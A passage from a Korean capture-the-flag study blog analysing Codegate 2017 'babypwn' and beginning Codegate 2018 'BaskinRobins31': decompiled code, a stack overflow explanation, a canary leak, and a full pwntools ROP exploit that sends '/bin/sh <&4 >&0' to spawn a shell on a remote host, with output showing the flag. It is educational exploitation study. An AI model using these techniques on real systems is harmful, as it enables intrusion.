NX Bit가 걸려있는 것을 확인할 수 있습니다.</strong><br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">socklen_t</span> addr_len; <span class="comment">// [esp+20h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> optval; <span class="comment">// [esp+24h] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+28h] [ebp-28h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr</span>;</span> <span class="comment">// [esp+2Ch] [ebp-24h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">v7</span>;</span> <span class="comment">// [esp+3Ch] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [esp+4Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">2</span> )</span><br><span class="line">    v5 = atoi(a2[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v5 = <span class="number">8181</span>;</span><br><span class="line">  dword_804B1BC = socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( dword_804B1BC == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;[!] socket Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  addr.sa_family = <span class="number">2</span>;</span><br><span class="line">  *(_WORD *)addr.sa_data = htons(v5);</span><br><span class="line">  *(_DWORD *)&amp;addr.sa_data[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  bzero(&amp;addr.sa_data[<span class="number">6</span>], <span class="number">8u</span>);</span><br><span class="line">  optval = <span class="number">1</span>;</span><br><span class="line">  setsockopt(dword_804B1BC, <span class="number">1</span>, <span class="number">2</span>, &amp;optval, <span class="number">4u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( bind(dword_804B1BC, &amp;addr, <span class="number">0x10</span>u) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;[!] bind Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( listen(dword_804B1BC, <span class="number">1024</span>) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;[!] listen Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      addr_len = <span class="number">16</span>;</span><br><span class="line">      fd = accept(dword_804B1BC, &amp;v7, &amp;addr_len);</span><br><span class="line">      <span class="keyword">if</span> ( fd != <span class="number">-1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      perror(<span class="string">&quot;[!] accept Error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !fork() )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">while</span> ( waitpid(<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>) &gt; <span class="number">0</span> )</span><br><span class="line">      ;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_8048B87();</span><br><span class="line">  close(dword_804B1BC);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>IDA를 이용해 코드로 변환해주었습니다. main 함수를 보면 socket을 이용해서 8181 포트로 서버를 여는 것을 볼 수 있습니다. 2020년 1월쯤에 C 언어로 이용해서 소켓으로 서버 구축한 적이 있기 때문에 바로 알아 챌 수 있었습니다. 소켓을 생성하고 마지막에는 sub_8048B87 함수를 호출하는 것을 볼 수 있습니다.</strong><br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_8048A71</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+1Ch] [ebp-3Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+24h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v2, <span class="number">0</span>, <span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_80488B1(<span class="string">&quot;\n===============================\n&quot;</span>);</span><br><span class="line">        sub_80488B1(<span class="string">&quot;1. Echo\n&quot;</span>);</span><br><span class="line">        sub_80488B1(<span class="string">&quot;2. Reverse Echo\n&quot;</span>);</span><br><span class="line">        sub_80488B1(<span class="string">&quot;3. Exit\n&quot;</span>);</span><br><span class="line">        sub_80488B1(<span class="string">&quot;===============================\n&quot;</span>);</span><br><span class="line">        v1 = sub_804895A();</span><br><span class="line">        <span class="keyword">if</span> ( v1 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        sub_80488B1(<span class="string">&quot;Input Your Message : &quot;</span>);</span><br><span class="line">        sub_8048907(&amp;v2, <span class="number">100</span>);</span><br><span class="line">        sub_80488B1(&amp;v2);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v1 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_80488B1(<span class="string">&quot;Input Your Message : &quot;</span>);</span><br><span class="line">      sub_8048907(&amp;v2, <span class="number">100</span>);</span><br><span class="line">      sub_80489C8(&amp;v2);</span><br><span class="line">      sub_80488B1(&amp;v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    sub_80488B1(<span class="string">&quot;\n[!] Wrong Input\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sub_8048A71 함수를 보면 v1, v2, v3 변수를 정의하는 것을 볼 수 있고, v3은 카나리입니다. 하지만 1번 메뉴와 2번 메뉴를 확인해보면 v2의 크기는 40인데 100만큼 입력 받기 때문에 BOF 취약점이 발생합니다. NX Bit가 걸려 있기 때문에 BOF 취약점을 이용해서 ROP를 해주면 될 거 같고, 카나리가 걸려 있기 때문에 카나리부터 릭을 해야합니다.</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8181</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Canary Leak</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;a&quot;</span> * <span class="number">41</span>)</span><br><span class="line">canary = u32(<span class="string">&quot;\x00&quot;</span> + p.recv(<span class="number">1024</span>)[<span class="number">41</span>:<span class="number">44</span>])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Canary : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(canary)))</span><br></pre></td></tr></table></figure><p><strong>Canary는 위와 같이 릭을 할 수 있습니다. v2의 값으로 <code>&quot;a&quot;</code>를 40개 주게 되면 v2 변수가 꽉차 v3 변수와 이어지게 됩니다. 하지만 v2를 꽉 채워주지 않으면 남은 메모리에 Null 값이 삽입되기 때문에 Canary를 릭할 수 없습니다. 하지만 40개를 다 채워줬는데 Canary가 출력 되지 않는데 이는 Canary에 시작도 Null로 시작하기 때문입니다. 그래서 <code>&quot;a&quot;</code>를 41개를 줘 Canary에 시작인 Null 값도 덮으면 Canary 전체를 릭할 수 있습니다.(Null 값이 존재하면 더 이상 읽지 않음)</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Codagate 2017$ objdump -h babypwn </span><br><span class="line"></span><br><span class="line">babypwn:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA       LMA       File off  Algn</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"> 24 .bss          0000000c  0804b1b4  0804b1b4  000021b4  2**2</span><br><span class="line">                  ALLOC</span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p><strong>objdump를 이용해 bss를 구했습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Codagate 2017$ gdb -q .&#x2F;babypwn</span><br><span class="line">Reading symbols from .&#x2F;babypwn...(no debugging symbols found)...done.</span><br><span class="line">gdb-peda$ p system</span><br><span class="line">$1 &#x3D; &#123;&lt;text variable, no debug info&gt;&#125; 0x8048620 &lt;system@plt&gt;</span><br><span class="line">gdb-peda$ </span><br></pre></td></tr></table></figure><p><strong>그리고 해당 파일에 system 함수가 존재하기 때문에 libc를 따로 구하지 않아도 될 거 같습니다. 이제 Canary를 릭하고, system 함수가 존재하는 것을 알았기 때문에 ROP를 해보겠습니다.</strong><br></p><ul><li>시나리오<br></li></ul><ol><li>카나리를 릭한다 (Null 값 조심).</li><li>recv 함수를 이용해서 bss에 Command를 넣어준다. (bss에 값을 넣어줄 수 있는 함수가 recv 함수뿐이 없다)</li><li>system 함수의 인자로 bss를 넘겨준다. bss에는 <code>/bin/sh &lt;&amp;4 &gt;&amp;0</code>가 들어있다. <br></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;141.164.52.207&quot;</span>, <span class="number">8181</span>)</span><br><span class="line">E = ELF(<span class="string">&quot;./babypwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Canary Leak</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;a&quot;</span> * <span class="number">41</span>)</span><br><span class="line">canary = u32(<span class="string">&quot;\x00&quot;</span> + p.recv(<span class="number">1024</span>)[<span class="number">41</span>:<span class="number">44</span>])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Canary : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(canary)))</span><br><span class="line"></span><br><span class="line">ppppr = <span class="number">0x8048eec</span></span><br><span class="line">bss = E.bss()</span><br><span class="line">system_plt = E.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">recv_plt = E.plt[<span class="string">&#x27;recv&#x27;</span>]</span><br><span class="line"></span><br><span class="line">command = <span class="string">&quot;/bin/sh &lt;&amp;4 &gt;&amp;0&quot;</span></span><br><span class="line">log.info(<span class="string">&quot;bss : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(bss)))</span><br><span class="line"></span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP Exploitation</span></span><br><span class="line">p = remote(<span class="string">&quot;141.164.52.207&quot;</span>, <span class="number">8181</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP Channing</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">40</span></span><br><span class="line">payload += p32(canary)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span> * <span class="number">12</span> <span class="comment"># Dummy[8] + SFP[4]</span></span><br><span class="line"></span><br><span class="line">payload += p32(recv_plt)</span><br><span class="line">payload += p32(ppppr)</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line">payload += p32(bss)</span><br><span class="line">payload += p32(<span class="built_in">len</span>(command)+<span class="number">1</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(system_plt)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span> * <span class="number">4</span></span><br><span class="line">payload += p32(bss)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exit -&gt; RET </span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(command)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Codagate 2017$ python exploit.py </span><br><span class="line">[+] Opening connection to 141.164.52.207 on port 8181: Done</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;pocas&#x2F;pwn&#x2F;Codagate 2017&#x2F;babypwn&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] Canary : 0x72c6c200</span><br><span class="line">[*] bss : 0x804b1b4</span><br><span class="line">[*] Closed connection to 141.164.52.207 port 8181</span><br><span class="line">[+] Opening connection to 141.164.52.207 on port 8181: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">FLAG&#123;GoodJob~!Y0u@re_Very__G@@d!!!!!!^.^&#125;</span><br><span class="line">$  </span><br></pre></td></tr></table></figure><blockquote><p>FLAG : FLAG{GoodJob~!Y0u@re_Very__G@@d!!!!!!^.^}</p></blockquote><hr><h2 id="PWN-D-4-2021-01-28"><a href="#PWN-D-4-2021-01-28" class="headerlink" title="PWN D+4 (2021.01.28)"></a>PWN D+4 (2021.01.28)<br></h2><hr><p>Codagate 2018 Challenge : BaskinRobins31</p><p><strong>오늘은 64 Bit ROP 익스를 공부하고, 좀 쉬운 문제가 없나 보다가 코게 2018에서 나온 BaskinRobins31라는 문제가 있어 풀어보겠습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;codegate&#x2F;2018&#x2F;BaskinRobins31$ checksec --file&#x3D;BaskinRobins31</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATHSymbolsFORTIFYFortifiedFortifiableFILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   83) Symbols  No03BaskinRobins31</span><br><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;codegate&#x2F;2018&#x2F;BaskinRobins31$ </span><br></pre></td></tr></table></figure><p><strong>checksef을 이용해서 보호 기법을 확인해보니 RELRO와 NX Bit가 걸려있는 것을 볼 수 있습니다. NX Bit를 우회하기 위해 ROP를 이용해 익스를 진행하면 될 거 같고, Partial RELRO이기 때문에 GOT Overwrite가 가능합니다.</strong><br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  _BOOL4 v6; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  v3 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  v5 = <span class="number">31</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;### This game is similar to the BaskinRobins31 game. ###&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;### The one that take the last match win ###&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;There are %u number(s)\n&quot;</span>, <span class="number">31LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v5 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      my_turn(&amp;v5);</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (<span class="keyword">unsigned</span> __int64)your_turn(&amp;v5) != <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;remaining number(s) : %i \n&quot;</span>, v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wow! You win!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hint is : ROP&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You lose!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>코드를 보면 while 문 안에 v6의 값이 참이 아니면 else 문으로 들어가 your_turn 함수를 호출하는 것을 볼 수 있습니다.</strong><br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">your_turn</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-B0h]</span></span><br><span class="line">  <span class="keyword">size_t</span> n; <span class="comment">// [rsp+B0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+BCh] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x96</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many numbers do you want to take ? (1-3)&quot;</span>);</span><br><span class="line">  n = read(<span class="number">0</span>, &amp;s, <span class="number">0x190</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, &amp;s, n);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  v4 = strtoul(&amp;s, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)check_decision((<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="keyword">char</span>)v4, <span class="number">0LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    *a1 -= v4;</span><br><span class="line">    result = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Don&#x27;t break the rules...:( &quot;</span>);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>your_turn 함수를 보면 read 함수를 이용해서 s 값을 입력 받고, write 함수를 이용해서 출력해주는 것을 볼 수 있습니다. 하지만 s는 memset 함수를 이용해서 150 사이즈만큼 초기화 시켜주는데 read 함수에서는 400만큼 입력을 받고 있어 BOF 취약점이 발생합니다. RET까지 덮을려면 s[176] + sfp[8]만큼 덮어주면 됩니다. 이제 가젯들을 구해보겠습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;codegate&#x2F;2018&#x2F;BaskinRobins31$ objdump -d BaskinRobins31 | grep -B4 &quot;ret&quot;</span><br><span class="line">(생략)</span><br><span class="line">--</span><br><span class="line">  400877:48 89 e5             mov    %rsp,%rbp</span><br><span class="line">  40087a:5f                   pop    %rdi</span><br><span class="line">  40087b:5e                   pop    %rsi</span><br><span class="line">  40087c:5a                   pop    %rdx</span><br><span class="line">  40087d:c3                   retq   </span><br><span class="line">  40087e:90                   nop</span><br><span class="line">  40087f:5d                   pop    %rbp</span><br><span class="line">  400880:c3                   retq   </span><br><span class="line">--</span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p><strong>objdump를 이용해서 가젯을 찾아보니 pop pop pop ret 가젯을 있는 것을 확인할 수 있습니다. 그리고 system 함수에서 사용할 pop ret 가젯도 그냥 pppr 가젯에서 2를 더한 것을 사용하려 했는데 이를 이용하니 잘 되지 않았습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ ropsearch &quot;pop rdi&quot;</span><br><span 